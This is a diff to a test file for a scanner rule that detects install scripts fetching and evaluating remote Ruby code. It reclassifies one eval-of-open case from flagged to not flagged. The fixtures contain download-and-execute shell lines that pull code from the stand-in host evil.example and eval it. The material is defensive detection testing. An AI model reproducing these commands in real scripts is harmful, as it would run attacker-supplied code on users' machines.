@@ -24,10 +24,6 @@ const FETCHED_CODE: Record<string, [string, string]> = {
     "install.sh",
     "#!/bin/sh\nruby -ropen-uri -e \"eval(URI.open('https://evil.example/x.rb').read)\"\n",
   ],
-  "ruby eval of the open-uri open in an install script": [
-    "install.sh",
-    "#!/bin/sh\nruby -e \"require 'open-uri'; eval(open('https://evil.example/x.rb').read)\"\n",
-  ],
   "ruby eval of Net::HTTP.get in an install script": [
     "install.sh",
     "#!/bin/sh\nruby -rnet/http -e \"eval(Net::HTTP.get(URI('https://evil.example/x.rb')))\"\n",
@@ -151,6 +147,7 @@ test("fetch APIs the fetched-code rule already names are reported once, by that 
 test("response objects and unrelated later fetches are not executed bodies", () => {
   for (const body of [
     'eval(URI.open("https://example.com/payload.rb"))',
+    'eval(open("https://example.com/payload.rb").read)',
     'eval(Net::HTTP.get_response(URI("https://example.com/payload.rb")))',
     'eval("puts :local"); URI.open("https://example.com/data").read',
     'exec("local command"); file_get_contents("https://example.com/data")',
